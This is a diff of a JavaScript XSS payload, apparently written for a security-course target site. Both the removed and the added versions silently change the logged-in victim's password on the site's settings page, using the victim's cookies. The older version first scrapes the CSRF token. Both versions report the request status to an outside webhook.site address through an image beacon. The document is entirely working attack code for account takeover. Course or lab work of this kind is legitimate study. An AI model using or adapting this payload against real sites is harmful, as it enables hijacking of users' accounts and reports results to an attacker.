@@ -1,28 +1,16 @@
 <script>
-fetch('https://cats.is-course.ru/settings', {
-    credentials: 'include'
-})
-.then(r => r.text())
-.then(html => {
-    var tokenMatch = html.match(/name="csrf_token" value="([^"]+)"/);
-    var csrfToken = tokenMatch ? tokenMatch[1] : '';
-    
-    var formData = new URLSearchParams();
-    formData.append('password', 'Abcdef_1234567');
-    formData.append('confirm-password', 'Abcdef_1234567');
-    if(csrfToken) formData.append('csrf_token', csrfToken);
-    
-    return fetch('https://cats.is-course.ru/settings', {
-        method: 'POST',
-        credentials: 'include',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: formData
-    });
-})
-.then(r => {
-    var img = new Image();
-    img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?v=2&status=" + r.status;
-});
+console.log('v3');
+
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://cats.is-course.ru/settings', true);
+xhr.withCredentials = true;
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+        var img = new Image();
+        img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?status=" + xhr.status;
+    }
+};
+xhr.send('password=Abcdef_1234567&confirm-password=Abcdef_1234567');
 </script>
